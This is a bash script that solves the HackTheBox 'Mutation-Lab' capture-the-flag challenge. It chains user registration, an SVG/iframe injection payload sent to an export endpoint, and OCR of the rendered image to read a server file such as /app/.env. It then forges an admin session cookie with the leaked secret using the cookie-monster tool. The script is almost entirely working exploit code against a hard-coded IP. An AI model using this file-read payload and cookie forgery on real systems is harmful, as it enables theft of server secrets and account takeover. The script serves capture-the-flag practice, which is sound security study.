#!/bin/bash
# Created this script to solve the HackTheBox challenge called Mutation-Lab

usage() {
    echo "Usage: $0 <host_address> <file_path>"
    echo "Example: $0 example.com /path/to/file"
    exit 1
}

if [[ "$#" -ne 2 || "$1" == "-h" || "$1" == "--help" ]]; then
    usage
fi

host="http://$1"
file_path="$2"

# Register user
curl -sq -X POST 'http://94.237.56.188:32416/api/register' --header 'Content-Type: application/json' --data '{"username":"test","password":"test"}'

# Login as registered user 
User_cookie=$(curl -i -sq -X POST 'http://94.237.56.188:32416/api/login' --header 'Content-Type: application/json' --data '{"username":"test","password":"test"}'| awk -F ' ' '/Set-Cookie/ {print $2}'|tr -d '\n')

# Use directory traversal to get the session secret key in /app/.env
dt=$(curl -qs "$host/api/export" -X POST --header 'Content-type: application/json' --cookie "Cookie: $User_cookie" --proxy "http://127.0.0.1:8080" --data '{"svg":"`<svg-dummy></svg-dummy><iframe src=\"file:///'"$file_path"'\" width=\"100%\" height=\"1000px\"></iframe> <svg viewBox=\"0 0 240 80\" height=\"1000\" width=\"1000\" xmlns=\"http://www.w3.org/2000/svg\">   <text x=\"0\" y=\"0\" class=\"Rrrrr\" id=\"demo\">data</text></svg>`"}'|awk -F ':"' '{print $2}'|tr -d \"\})

wget -q "$host$dt" -O pic.png

# convert text in the picture into text we can use
tesseract pic.png session_secret_key

# Uncomment line below to double check that tesseract converted properly
#ristretto pic.png

# Forge admin cookies using the found session secret key
session_secret_key=$(cat session_secret_key.txt|awk -F '=' '{print $2}')

echo -n '{"username":"admin"}' > new_cookie.json

git clone https://github.com/DigitalInterruption/cookie-monster && cd cookie-monster && npm install && npm link

admin_cookies=$(cookie-monster -e -f new_cookie.json -k "$session_secret_key"| awk -F ' ' '/Cookie: / {print $4}'|sed -z 's/\x1b\[[0-9;]*m//g'|sed -z 's/\n/;/g')

# Log in as user admin and get the flag
curl -qs "http://94.237.56.188:32416/dashboard" --cookie "$admin_cookies" --proxy "http://127.0.0.1:8080"|grep -i flag
